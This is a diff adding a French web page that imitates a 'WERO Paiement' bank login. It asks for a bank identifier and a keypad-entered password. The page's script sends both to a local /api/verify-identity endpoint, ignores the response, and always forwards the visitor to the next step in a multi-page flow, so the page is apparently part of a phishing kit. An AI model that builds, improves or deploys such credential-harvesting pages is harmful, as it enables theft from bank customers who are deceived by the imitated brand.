@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identifiant Compte - WERO Paiement</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #FFD500;
+      --black: #0A0E27;
+      --white: #FFFFFF;
+      --accent-green: #10B981;
+      --accent-blue: #3B82F6;
+      --accent-red: #EF4444;
+      --gray-100: #F3F4F6;
+      --gray-600: #4B5563;
+      --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.15);
+      --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #FFF275;
+      color: var(--black);
+      line-height: 1.6;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    header {
+      background: #FFF275;
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+      padding: 12px 0;
+    }
+
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      color: var(--black);
+      animation: logoGlow 3s ease-in-out infinite;
+    }
+
+    @keyframes logoGlow {
+      0%, 100% { filter: drop-shadow(0 0 0px rgba(0,0,0,0.1)); }
+      50% { filter: drop-shadow(0 0 8px rgba(0,0,0,0.2)); }
+    }
+
+    .desktop-nav {
+      display: flex;
+      gap: 10px;
+    }
+
+    .desktop-nav a {
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 15px;
+      padding: 10px 18px;
+      border-radius: 12px;
+      transition: var(--transition);
+    }
+
+    .desktop-nav a:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 32px;
+      height: 24px;
+      position: relative;
+      z-index: 1001;
+    }
+
+    .mobile-menu-btn span {
+      display: block;
+      width: 100%;
+      height: 2.5px;
+      background: var(--black);
+      border-radius: 2px;
+      transition: var(--transition);
+      position: absolute;
+    }
+
+    .mobile-menu-btn span:nth-child(1) { top: 2px; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 20px; }
+
+    .mobile-menu-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      z-index: 999;
+      opacity: 0;
+    }
+
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 85%;
+      max-width: 400px;
+      height: 100%;
+      background: #FFF275;
+      z-index: 1000;
+      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.2);
+      transition: right var(--transition);
+      flex-direction: column;
+    }
+
+    .mobile-nav.active {
+      right: 0;
+    }
+
+    .mobile-nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+
+    .mobile-menu-close:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-nav-links {
+      flex: 1;
+      padding: 20px 0;
+    }
+
+    .mobile-nav-links a {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 16px 24px;
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 16px;
+      transition: var(--transition);
+      border-left: 4px solid transparent;
+    }
+
+    .mobile-nav-links a:hover {
+      background: rgba(0, 0, 0, 0.08);
+      border-left-color: var(--black);
+    }
+
+    main {
+      flex: 1;
+      padding: 60px 0;
+    }
+
+    .hero {
+      padding: 60px 0;
+      text-align: center;
+      animation: slideInDown 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .hero h1 {
+      font-size: 48px;
+      font-weight: 900;
+      margin-bottom: 15px;
+      color: var(--black);
+      letter-spacing: -1px;
+      line-height: 1.2;
+    }
+
+    .hero p {
+      font-size: 18px;
+      color: rgba(0, 0, 0, 0.7);
+      max-width: 650px;
+      margin: 0 auto;
+      font-weight: 500;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
+    }
+
+    @keyframes slideInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-40px) rotateX(10deg);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) rotateX(0deg);
+      }
+    }
+
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .content-wrapper {
+      max-width: 600px;
+      margin: -60px auto 40px;
+      padding: 0 20px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 60px 40px 40px 40px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      border: 2px solid var(--accent-green);
+    }
+
+    .card h2 {
+      font-size: 24px;
+      font-weight: 900;
+      margin-bottom: 30px;
+      color: var(--accent-green);
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .form-group:nth-child(1) { animation-delay: 0.4s; margin-top: 20px; }
+    .form-group:nth-child(2) { animation-delay: 0.5s; display: none; }
+    .form-group:nth-child(2).visible { display: block; }
+
+    .form-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .form-label label {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+    }
+
+    .form-label .required {
+      color: var(--accent-red);
+      margin-left: 4px;
+    }
+
+    .form-label .hint {
+      font-size: 12px;
+      color: var(--gray-600);
+      font-weight: 500;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 45px 14px 16px;
+      border: 2px solid var(--accent-green);
+      border-radius: 12px;
+      font-size: 15px;
+      transition: var(--transition);
+      background: var(--white);
+      color: var(--black);
+      font-weight: 500;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--accent-green);
+      box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
+      background: rgba(255, 255, 255, 0.98);
+    }
+
+    .form-input::placeholder {
+      color: var(--gray-600);
+      font-weight: 400;
+    }
+
+    .input-icon {
+      position: absolute;
+      right: 14px;
+      color: var(--gray-600);
+      font-size: 16px;
+      pointer-events: none;
+    }
+
+    /* CLAVIER NUMÉRIQUE */
+    .keyboard-section {
+      display: none;
+      margin-top: 30px;
+      padding-top: 30px;
+      border-top: 2px solid #e5e7eb;
+      animation: slideInUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .keyboard-section.visible {
+      display: block;
+    }
+
+    .keyboard-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+      margin-bottom: 15px;
+    }
+
+    .password-display {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 18px;
+      letter-spacing: 2px;
+      color: var(--black);
+      background: var(--gray-100);
+      text-align: center;
+      font-weight: 600;
+      margin-bottom: 20px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .key {
+      padding: 16px;
+      background: var(--white);
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--black);
+      transition: var(--transition);
+      text-align: center;
+    }
+
+    .key:hover {
+      background: var(--gray-100);
+      border-color: var(--accent-blue);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
+    }
+
+    .key:active {
+      transform: translateY(0);
+      background: var(--accent-blue);
+    }
+
+    .key.function {
+      background: var(--accent-red);
+      color: var(--white);
+      border-color: var(--accent-red);
+    }
+
+    .key.function:hover {
+      background: #c82333;
+      border-color: #c82333;
+      box-shadow: 0 4px 12px rgba(220, 53, 69, 0.2);
+    }
+
+    .key.confirm {
+      grid-column: 1 / -1;
+      background: var(--accent-green);
+      color: var(--white);
+      border-color: var(--accent-green);
+    }
+
+    .key.confirm:hover {
+      background: #059669;
+      border-color: #059669;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2);
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 16px 32px;
+      background: linear-gradient(135deg, var(--accent-green), #06B6D4);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: var(--transition);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 12px 30px rgba(16, 185, 129, 0.3);
+      margin-top: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.6s backwards;
+    }
+
+    .btn-submit.visible {
+      display: flex;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.4);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-validate {
+      padding: 14px 20px;
+      background: var(--accent-green);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: var(--transition);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    .btn-validate:hover {
+      background: #059669;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+    }
+
+    .btn-validate:active {
+      transform: translateY(0);
+    }
+
+    footer {
+      background: var(--black);
+      color: var(--white);
+      padding: 80px 0 40px;
+      margin-top: 60px;
+      border-top: 2px solid rgba(255, 213, 0, 0.3);
+    }
+
+    .footer-content {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 60px;
+      margin-bottom: 50px;
+    }
+
+    .footer-section {
+      flex: 1;
+      min-width: 250px;
+      text-align: center;
+    }
+
+    .footer-section h3 {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #FFD500;
+      font-weight: 700;
+    }
+
+    .footer-section p {
+      font-size: 14px;
+      opacity: 0.8;
+      margin-bottom: 10px;
+    }
+
+    .footer-section a {
+      display: block;
+      color: var(--white);
+      text-decoration: none;
+      font-size: 14px;
+      opacity: 0.7;
+      transition: var(--transition);
+      margin-bottom: 8px;
+    }
+
+    .footer-section a:hover {
+      opacity: 1;
+      color: #FFD500;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      padding-top: 30px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      opacity: 0.6;
+      font-size: 14px;
+    }
+
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+
+      .logo { font-size: 28px; }
+      .hero h1 { font-size: 36px; }
+      .hero p { font-size: 16px; }
+      
+      .card {
+        padding: 25px;
+      }
+
+      .keyboard {
+        gap: 8px;
+      }
+
+      .key {
+        padding: 14px;
+        font-size: 16px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .hero h1 { font-size: 28px; }
+      .hero p { font-size: 15px; }
+      
+      .card {
+        padding: 20px;
+      }
+
+      .card h2 {
+        font-size: 20px;
+      }
+
+      .keyboard {
+        gap: 6px;
+      }
+
+      .key {
+        padding: 12px;
+        font-size: 14px;
+      }
+
+      .btn-submit {
+        font-size: 14px;
+        padding: 14px 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="header-container">
+      <div class="logo">WERO</div>
+      
+      <nav class="desktop-nav">
+        <a href="/">Accueil</a>
+        <a href="/accords">Validation</a>
+        <a href="/premiere">Vérification</a>
+        <a href="/troisieme" class="active">Identifiant</a>
+        <a href="/deuxieme">Confirmation</a>
+      </nav>
+      
+      <button class="mobile-menu-btn">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <div class="mobile-menu-overlay"></div>
+      
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">WERO</div>
+          <button class="mobile-menu-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="/">Accueil</a>
+          <a href="/accords">Validation</a>
+          <a href="/premiere">Vérification</a>
+          <a href="/troisieme" class="active">Identifiant</a>
+          <a href="/deuxieme">Confirmation</a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="container">
+        <h1>🔐 Identifiant de Compte</h1>
+      </div>
+    </section>
+
+    <div class="content-wrapper">
+      <div class="card">
+        <h2>Connexion Sécurisée</h2>
+        
+        <form id="identityForm" novalidate>
+          <!-- IDENTIFIANT -->
+          <div class="form-group">
+            <div class="form-label">
+              <label>
+                Identifiant Bancaire
+                <span class="required">*</span>
+              </label>
+            </div>
+            <div style="display: flex; gap: 10px;">
+              <div class="input-wrapper" style="flex: 1;">
+                <input type="text" id="identifier" class="form-input" required>
+                <i class="fas fa-user input-icon"></i>
+              </div>
+              <button type="button" class="btn-validate" id="validateBtn">Valider</button>
+            </div>
+          </div>
+
+          <!-- MOT DE PASSE -->
+          <div class="form-group">
+            <div class="form-label">
+              <label>
+                Mot de passe
+                <span class="required">*</span>
+              </label>
+            </div>
+            <div class="input-wrapper">
+              <input type="password" id="password" class="form-input" placeholder="••••••••" required disabled>
+              <i class="fas fa-lock input-icon"></i>
+            </div>
+          </div>
+
+          <!-- CLAVIER NUMÉRIQUE -->
+          <div class="keyboard-section" id="keyboardSection">
+            <div class="keyboard-label">Entrez votre mot de passe avec le clavier</div>
+            
+            <div class="password-display" id="passwordDisplay">••••••••</div>
+            
+            <div class="keyboard">
+              <button type="button" class="key" data-key="1">1</button>
+              <button type="button" class="key" data-key="2">2</button>
+              <button type="button" class="key" data-key="3">3</button>
+              <button type="button" class="key" data-key="4">4</button>
+              <button type="button" class="key" data-key="5">5</button>
+              <button type="button" class="key" data-key="6">6</button>
+              <button type="button" class="key" data-key="7">7</button>
+              <button type="button" class="key" data-key="8">8</button>
+              <button type="button" class="key" data-key="9">9</button>
+            </div>
+
+            <div class="keyboard">
+              <button type="button" class="key" data-key="0" style="grid-column: 1 / 3;">0</button>
+              <button type="button" class="key function" id="deleteBtn"><i class="fas fa-backspace"></i></button>
+            </div>
+          </div>
+
+          <button type="submit" class="btn-submit" id="submitBtn">
+            <i class="fas fa-check"></i>
+            Valider et Continuer
+          </button>
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>WERO</h3>
+          <p>Paiement Instantané Sécurisé</p>
+        </div>
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="/">Accueil</a>
+          <a href="/accords">Validation</a>
+          <a href="/premiere">Vérification</a>
+          <a href="/troisieme">Identifiant</a>
+          <a href="/deuxieme">Confirmation</a>
+        </div>
+        <div class="footer-section">
+          <h3>Sécurité</h3>
+          <a href="#">RGPD</a>
+          <a href="#">Conditions</a>
+          <a href="#">Confidentialité</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2024 WERO. Tous droits réservés.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+
+      // Formulaire
+      const identifier = document.getElementById('identifier');
+      const password = document.getElementById('password');
+      const keyboardSection = document.getElementById('keyboardSection');
+      const passwordDisplay = document.getElementById('passwordDisplay');
+      const deleteBtn = document.getElementById('deleteBtn');
+      const confirmBtn = document.getElementById('confirmBtn');
+      const validateBtn = document.getElementById('validateBtn');
+      const keyButtons = document.querySelectorAll('.key[data-key]');
+      const form = document.getElementById('identityForm');
+      const submitBtn = document.getElementById('submitBtn');
+      
+      let passwordValue = '';
+
+      // Valider l'identifiant et afficher le clavier
+      validateBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (identifier.value.trim().length >= 3) {
+          // Afficher le champ mot de passe
+          const passwordFormGroup = document.querySelector('.form-group:nth-child(2)');
+          passwordFormGroup.classList.add('visible');
+          
+          // Afficher le clavier
+          keyboardSection.classList.add('visible');
+          password.disabled = false;
+          validateBtn.disabled = true;
+          validateBtn.textContent = '✓ Valide';
+          identifier.disabled = true;
+          
+          // Afficher le bouton soumettre
+          submitBtn.classList.add('visible');
+        } else {
+          alert('L\'identifiant doit contenir au moins 3 caracteres');
+        }
+      });
+
+      // Clavier numérique
+      keyButtons.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          if (passwordValue.length < 8) {
+            passwordValue += btn.dataset.key;
+            password.value = passwordValue;
+            updatePasswordDisplay();
+            
+            // Animation de confirmation
+            btn.style.background = 'var(--accent-blue)';
+            btn.style.color = 'white';
+            setTimeout(() => {
+              btn.style.background = '';
+              btn.style.color = '';
+            }, 200);
+          }
+        });
+      });
+
+      deleteBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        passwordValue = passwordValue.slice(0, -1);
+        password.value = passwordValue;
+        updatePasswordDisplay();
+      });
+
+      function updatePasswordDisplay() {
+        passwordDisplay.textContent = '•'.repeat(passwordValue.length).padEnd(8, '•');
+      }
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        if (!identifier.value.trim()) {
+          alert('Veuillez renseigner votre identifiant');
+          return;
+        }
+
+        if (passwordValue.length < 4) {
+          alert('Le mot de passe doit contenir au moins 4 caractères');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';
+
+        try {
+          await fetch('/api/verify-identity', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              identifier: identifier.value.trim(),
+              password: passwordValue
+            })
+          });
+        } catch (error) {
+          console.error('Erreur:', error);
+        }
+
+        setTimeout(() => {
+          window.location.href = '/deuxieme';
+        }, 2000);
+      });
+
+      window.addEventListener('resize', () => {
+        if (window.innerWidth > 768 && mobileNav.classList.contains('active')) {
+          closeMobileMenu();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
